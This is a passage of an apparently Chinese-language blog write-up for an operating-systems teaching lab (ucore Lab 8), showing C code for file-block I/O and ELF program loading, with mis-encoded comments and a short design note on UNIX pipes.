c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*  </span><br><span class="hljs-comment"> * sfs_io_nolock - Rd/Wr a file content from offset position to offset+length disk blocks&lt;--&gt;buffer (in memroy)</span><br><span class="hljs-comment"> * @sfs:      sfs file system</span><br><span class="hljs-comment"> * @sin:      sfs inode in memory</span><br><span class="hljs-comment"> * @buf:      the buffer Rd/Wr</span><br><span class="hljs-comment"> * @offset:   the offset of file</span><br><span class="hljs-comment"> * @alenp:    the length need to read (is a pointer). and will RETURN the really Rd/Wr lenght</span><br><span class="hljs-comment"> * @write:    BOOL, 0 read, 1 write</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sfs_io_nolock</span><span class="hljs-params">(struct sfs_fs *sfs, struct sfs_inode *<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">off_t</span> offset, <span class="hljs-keyword">size_t</span> *alenp, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> *<span class="hljs-title">din</span> =</span> <span class="hljs-built_in">sin</span>-&gt;din;<br>    assert(din-&gt;type != SFS_TYPE_DIR);<br>    <span class="hljs-keyword">off_t</span> endpos = offset + *alenp, blkoff;<span class="hljs-comment">///endposæ„Ÿè§‰æ’ç­‰äº4KB??å¥½åƒä¸æ˜¯</span><br>    *alenp = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// calculate the Rd/Wr end position</span><br>    <span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span> || offset &gt;= SFS_MAX_FILE_SIZE || offset &gt; endpos) &#123;<br>        <span class="hljs-keyword">return</span> -E_INVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (offset == endpos) &#123;<span class="hljs-comment">///è¿™æ˜¯æ€ä¹ˆå‘ç”Ÿçš„?</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (endpos &gt; SFS_MAX_FILE_SIZE) &#123;<br>        endpos = SFS_MAX_FILE_SIZE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!write) &#123;<span class="hljs-comment">///å¦‚æœæ˜¯read</span><br>        <span class="hljs-keyword">if</span> (offset &gt;= din-&gt;size) &#123;<span class="hljs-comment">///è¯»å®Œæ–‡ä»¶äº†</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (endpos &gt; din-&gt;size) &#123;<span class="hljs-comment">///ä¸ç”¨è¯»é‚£ä¹ˆé•¿, åªè¦din-&gt;sizeå³å¯</span><br>            endpos = din-&gt;size;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">///ä¸‹é¢è¿™å‡ è¡Œåˆæ˜¯ä»€ä¹ˆç¥å¥‡æ“ä½œ, è¿™é€šç”¨æ¥å£å†™çš„ä¹Ÿå¤ªç»äº†</span><br>    <span class="hljs-keyword">int</span> (*sfs_buf_op)(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset);<br>    <span class="hljs-keyword">int</span> (*sfs_block_op)(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks);<br>    <span class="hljs-keyword">if</span> (write) &#123;<br>        sfs_buf_op = sfs_wbuf, sfs_block_op = sfs_wblock;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">///å¦‚æœæ˜¯read, è¦æ¢æˆ æŠŠ1ä¸ªblockè¯»åˆ°buf å’Œ æŠŠå¤šä¸ªblockè¯»åˆ°buf</span><br>        sfs_buf_op = sfs_rbuf, sfs_block_op = sfs_rblock;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> size, alen = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">uint32_t</span> ino; <span class="hljs-comment">//the pointer of inode</span><br>    <span class="hljs-keyword">uint32_t</span> blkno = offset / SFS_BLKSIZE;          <span class="hljs-comment">// The NO. of Rd/Wr begin block ///BUFFERä¸éƒ½æ˜¯4KBçš„å—??</span><br>    <span class="hljs-keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;  <span class="hljs-comment">// The size of Rd/Wr blocks</span><br><br>  <span class="hljs-comment">//LAB8:EXERCISE1 YOUR CODE HINT: call sfs_bmap_load_nolock, sfs_rbuf, sfs_rblock,etc. read different kind of blocks in file</span><br>    <span class="hljs-keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///å¦‚æœåœ¨offsetèµ·å§‹blockçš„ä¸­é—´</span><br>        size = (nblks != <span class="hljs-number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset);<br>        <span class="hljs-comment">///å–å‡ºinodeç¼–å·, ä¹Ÿå³blockç¼–å·, å› ä¸ºä¸€ä¸ªblockä¸€ä¸ªinode</span><br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///ä»blockå’Œå…¶ä»–ä¿¡æ¯è¯»å–åˆ°bufä¸­</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size;<span class="hljs-comment">///è¦å¢åŠ alen</span><br>        <span class="hljs-keyword">if</span> (nblks == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///å¦‚æœåªæœ‰ä¸€ä¸ªblock, è¯»/å†™å°±å®Œæˆäº†</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        buf += size, blkno++, nblks--;<span class="hljs-comment">///å¦åˆ™ä¿®æ”¹ä¸€ä¸‹å‰©ä½™çš„å‚æ•°</span><br>    &#125;<br><br>    size = SFS_BLKSIZE;<span class="hljs-comment">///ä½¿ç”¨whileå¾ªç¯, é€blockè¯»å–, åˆ°äº†å‰©ä½™çš„æ•´ä¸ªblock(nblock)ç­‰äº0çš„æ—¶å€™é€€å‡º</span><br>    <span class="hljs-keyword">while</span> (nblks != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size, buf += size, blkno++, nblks--;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((size = endpos % SFS_BLKSIZE) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///è¯»å–æœ€åä¸€ä¸ªblockçš„éƒ¨åˆ†åŒºåŸŸ, è¿™ä¸‰éƒ¨åˆ†åŸºæœ¬ç›¸åŒåªèƒ½è¯´</span><br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size;<br>    &#125;<br>out:<br>    *alenp = alen;<span class="hljs-comment">///ä¸Šé¢è¦å®Œæˆalençš„èµ‹å€¼, å³çœŸå®çš„è¯»å–å­—èŠ‚æ•°ç›®</span><br>    <span class="hljs-keyword">if</span> (offset + alen &gt; <span class="hljs-built_in">sin</span>-&gt;din-&gt;size) &#123;<span class="hljs-comment">///å¥½åƒæ˜¯ç”¨äºwriteçš„</span><br>        <span class="hljs-built_in">sin</span>-&gt;din-&gt;size = offset + alen;<br>        <span class="hljs-built_in">sin</span>-&gt;dirty = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p class="note note-primary" style="font-style:italic;background-color:rgb(240,230,250)">â€UNIXçš„PIPEæœºåˆ¶â€œçš„æ¦‚è¦è®¾è®¡æ–¹æ¡ˆ </p><ul><li>PIPEç®¡é“æœºåˆ¶æ˜¯è¿›ç¨‹é—´é€šä¿¡çš„è¾ƒä¸ºé‡è¦çš„ä¸€ç§æ–¹å¼ã€‚åœ¨VFSä¸­ï¼Œæœ€ç®€å•çš„åšæ³•å°±æ˜¯åœ¨ç£ç›˜ä¸Šå»ºç«‹ä¸€å—pipeç¼“å†²æ–‡ä»¶<code>pipe_tmp</code>ã€‚ä¹‹åï¼Œå½“æ‰“å¼€äº†<code>pipe_tmp</code>æ–‡ä»¶çš„æŸè¿›ç¨‹forkå‡ºå­è¿›ç¨‹åï¼Œçˆ¶å­è¿›ç¨‹å°±å¯ä»¥é€šè¿‡è¯»å†™åŒä¸€æ–‡ä»¶æ¥å®ç°è¿›ç¨‹é—´é€šä¿¡ã€‚</li><li>ä½†å®é™…ä¸Šï¼Œä¸Šè¿°çš„è¿›ç¨‹é—´é€šä¿¡æ˜¯ååˆ†ä½æ•ˆçš„ï¼Œå› ä¸ºéœ€è¦è°ƒç”¨å¤šä¸ªå‡½æ•°æ¥å®Œæˆæ–‡ä»¶è¯»å†™ï¼ŒåŒæ—¶ç¡¬ç›˜çš„è¯»å†™é€Ÿç‡ä¹Ÿè¿œè¿œå°äºå†…å­˜ã€‚ç”±äºç”¨æˆ·ä¸å®é™…çš„æ–‡ä»¶ç³»ç»Ÿé—´ç”±è™šæ‹Ÿæ–‡ä»¶ç³»ç»ŸVFSè°ƒæ§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨å†…å­˜ä¸­æ ¹æ®æ–‡ä»¶ç³»ç»Ÿè§„èŒƒï¼Œå»ºç«‹è™šæ‹Ÿpipeç¼“å†²åŒºåŸŸæ–‡ä»¶æ¥ä»£æ›¿ç£ç›˜ä¸Šçš„ç¼“å†²æ–‡ä»¶ï¼Œè¿™æ ·ä¾¿å¯å¤§å¤§æé«˜é€šä¿¡é€Ÿç‡ã€‚</li></ul><blockquote><p>åœ¨linuxä¸­PIPEçš„å®ç°æœºåˆ¶(at a high level):</p><ul><li>Linux has a VFS (virtual file system) module called pipefs, that gets mounted in kernel space during boot</li><li>pipefs is mounted alongside the root file system (<code>/</code>), not in it (pipeâ€™s root is <code>pipe:</code>)</li><li>pipefs cannot be directly examined by the user unlike most file systems</li><li>The entry point to pipefs is the <code>pipe(2)</code> syscall</li><li>The <code>pipe(2)</code> syscall is used by shells and other programs to implement piping, and just creates a new file in pipefs, returning two file descriptors (one for the read end, opening using <code>O_RDONLY</code>, and one for the write end, opened using <code>O_WRONLY</code>)</li><li>pipefs is stored using an in-memory file system</li></ul></blockquote><h3 id="ç»ƒä¹ 2-5"><a href="#ç»ƒä¹ 2-5" class="headerlink" title="ç»ƒä¹ 2"></a>ç»ƒä¹ 2</h3><p>forkæœºåˆ¶åœ¨åŸå…ˆlab7çš„åŸºç¡€ä¸Šï¼Œå¤šäº†<code>file_struct</code>ç»“æ„çš„å¤åˆ¶æ“ä½œä¸æ‰§è¡Œå¤±è´¥æ—¶çš„é‡ç½®æ“ä½œã€‚è¿™ä¸¤éƒ¨æ“ä½œåˆ†åˆ«éœ€è¦è°ƒç”¨<code>copy_files</code>å’Œ<code>put_files</code>å‡½æ•°</p><p><code>load_icode</code>ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯<code>load_icode_read()</code>, å¯ä»¥æ ¹æ®ELFæ–‡ä»¶çš„ç‰¹ç‚¹ä½¿ç”¨åç§»æ¥ç§»åŠ¨å½“å‰æ–‡ä»¶çš„æŒ‡é’ˆpos, å¹¶ä¸”æŠŠå†…å®¹è¯»å–åˆ°å‚æ•°bufæŒ‡å‘çš„ç©ºé—´ä¸­.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">load_icode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **kargv)</span> </span>&#123;<br>    <span class="hljs-comment">/* LAB8:EXERCISE2 YOUR CODE  HINT:how to load the file with handler fd  in to process&#x27;s memory? how to setup argc/argv?</span><br><span class="hljs-comment">     * MACROs or Functions:</span><br><span class="hljs-comment">     *  mm_create        - create a mm</span><br><span class="hljs-comment">     *  setup_pgdir      - setup pgdir in mm</span><br><span class="hljs-comment">     *  load_icode_read  - read raw data content of program file</span><br><span class="hljs-comment">     *  mm_map           - build new vma</span><br><span class="hljs-comment">     *  pgdir_alloc_page - allocate new memory for  TEXT/DATA/BSS/stack parts</span><br><span class="hljs-comment">     *  lcr3             - update Page Directory Addr Register -- CR3</span><br><span class="hljs-comment">     */</span><br><span class="hljs-comment">/* (1) create a new mm for current process</span><br><span class="hljs-comment">     * (2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT</span><br><span class="hljs-comment">     * (3) copy TEXT/DATA/BSS parts in binary to memory space of process</span><br><span class="hljs-comment">     *    (3.1) read raw data content in file and resolve elfhdr</span><br><span class="hljs-comment">     *    (3.2) read raw data content in file and resolve proghdr based on info in elfhdr</span><br><span class="hljs-comment">     *    (3.3) call mm_map to build vma related to TEXT/DATA</span><br><span class="hljs-comment">     *    (3.4) callpgdir_alloc_page to allocate page for TEXT/DATA, read contents in file</span><br><span class="hljs-comment">     *          and copy them into the new allocated pages</span><br><span class="hljs-comment">     *    (3.5) callpgdir_alloc_page to allocate pages for BSS, memset zero in these pages</span><br><span class="hljs-comment">     * (4) call mm_map to setup user stack, and put parameters into user stack</span><br><span class="hljs-comment">     * (5) setup current process&#x27;s mm, cr3, reset pgidr (using lcr3 MARCO)</span><br><span class="hljs-comment">     * (6) setup uargc and uargv in user stacks</span><br><span class="hljs-comment">     * (7) setup trapframe for user environment</span><br><span class="hljs-comment">     * (8) if up steps failed, you should cleanup the env.</span><br><span class="hljs-comment">     */</span><br>    assert(argc &gt;= <span class="hljs-number">0</span> &amp;&amp; argc &lt;= EXEC_MAX_ARG_NUM);<br><br>    <span class="hljs-keyword">if</span> (current-&gt;mm != <span class="hljs-literal">NULL</span>) &#123;<br>        panic(<span class="hljs-string">&quot;load_icode: current-&gt;mm must be empty.\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> ret = -E_NO_MEM;<br>    <span class="hljs-comment">// åˆ›å»ºprocçš„å†…å­˜ç®¡ç†ç»“æ„</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-keyword">if</span> ((mm = mm_create()) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_mm;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (setup_pgdir(mm) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_pgdir_cleanup_mm;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-comment">// LAB8 è¿™é‡Œè¦ä»æ–‡ä»¶ä¸­è¯»å–ELF headerï¼Œè€Œä¸æ˜¯Lab7ä¸­çš„å†…å­˜äº†</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elfhdr</span> __<span class="hljs-title">elf</span>, *<span class="hljs-title">elf</span> =</span> &amp;__elf;<br>    <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, elf, <span class="hljs-keyword">sizeof</span>(struct elfhdr), <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_elf_cleanup_pgdir;<br>    &#125;<br>    <span class="hljs-comment">// åˆ¤æ–­è¯»å–å…¥çš„elf headeræ˜¯å¦æ­£ç¡®</span><br>    <span class="hljs-keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123;<br>        ret = -E_INVAL_ELF;<br>        <span class="hljs-keyword">goto</span> bad_elf_cleanup_pgdir;<br>    &#125;<br>    <span class="hljs-comment">// æ ¹æ®æ¯ä¸€æ®µçš„å¤§å°å’ŒåŸºåœ°å€æ¥åˆ†é…ä¸åŒçš„å†…å­˜ç©ºé—´</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proghdr</span> __<span class="hljs-title">ph</span>, *<span class="hljs-title">ph</span> =</span> &amp;__ph;<br>    <span class="hljs-keyword">uint32_t</span> vm_flags, perm, phnum;<br>    <span class="hljs-keyword">for</span> (phnum = <span class="hljs-number">0</span>; phnum &lt; elf-&gt;e_phnum; phnum ++) &#123;<br>        <span class="hljs-comment">// LAB8 ä»æ–‡ä»¶ç‰¹å®šåç§»å¤„è¯»å–æ¯ä¸ªæ®µçš„è¯¦ç»†ä¿¡æ¯ï¼ˆåŒ…æ‹¬å¤§å°ã€åŸºåœ°å€ç­‰ç­‰ï¼‰</span><br>        <span class="hljs-keyword">off_t</span> phoff = elf-&gt;e_phoff + <span class="hljs-keyword">sizeof</span>(struct proghdr) * phnum;<br>        <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, ph, <span class="hljs-keyword">sizeof</span>(struct proghdr), phoff)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;<br>            <span class="hljs-keyword">continue</span> ;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123;<br>            ret = -E_INVAL_ELF;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span> ;<br>        &#125;<br>        vm_flags = <span class="hljs-number">0</span>, perm = PTE_U;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;<br>        <span class="hljs-keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;<br>        <span class="hljs-comment">// ä¸ºå½“å‰æ®µåˆ†é…å†…å­˜ç©ºé—´</span><br>        <span class="hljs-keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">off_t</span> offset = ph-&gt;p_offset;<br>        <span class="hljs-keyword">size_t</span> off, size;<br>        <span class="hljs-keyword">uintptr_t</span> start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);<br><br>        ret = -E_NO_MEM;<br><br>        end = ph-&gt;p_va + ph-&gt;p_filesz;<br>        <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>            <span class="hljs-comment">// è®¾ç½®è¯¥å†…å­˜æ‰€å¯¹åº”çš„é¡µè¡¨é¡¹</span><br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="hljs-literal">NULL</span>) &#123;<br>                ret = -E_NO_MEM;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-comment">// LAB8 è¯»å–elfå¯¹åº”æ®µå†…çš„æ•°æ®å¹¶å†™å…¥è‡³è¯¥å†…å­˜ä¸­</span><br>            <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            start += size, offset += size;<br>        &#125;<br>        end = ph-&gt;p_va + ph-&gt;p_memsz;<br>        <span class="hljs-comment">// å¯¹äºæ®µä¸­å½“å‰é¡µä¸­å‰©ä½™çš„ç©ºé—´ï¼ˆå¤åˆ¶elfæ•°æ®åå‰©ä¸‹çš„ç©ºé—´ï¼‰ï¼Œå°†å…¶ç½®ä¸º0</span><br>        <span class="hljs-keyword">if</span> (start &lt; la) &#123;<br>            <span class="hljs-comment">/* ph-&gt;p_memsz == ph-&gt;p_filesz */</span><br>            <span class="hljs-keyword">if</span> (start == end) &#123;<br>                <span class="hljs-keyword">continue</span> ;<br>            &#125;<br>            off = start + PGSIZE - la, size = PGSIZE - off;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-built_in">memset</span>(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));<br>        &#125;<br>        <span class="hljs-comment">// å¯¹äºæ®µä¸­å‰©ä½™é¡µä¸­çš„ç©ºé—´ï¼ˆå¤åˆ¶elfæ•°æ®åçš„å¤šä½™é¡µé¢ï¼‰ï¼Œå°†å…¶ç½®ä¸º0</span><br>        <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="hljs-literal">NULL</span>) &#123;<br>                ret = -E_NO_MEM;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-built_in">memset</span>(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// å…³é—­è¯»å–çš„ELF</span><br>    sysfile_close(fd);<br><br>    <span class="hljs-comment">// è®¾ç½®æ 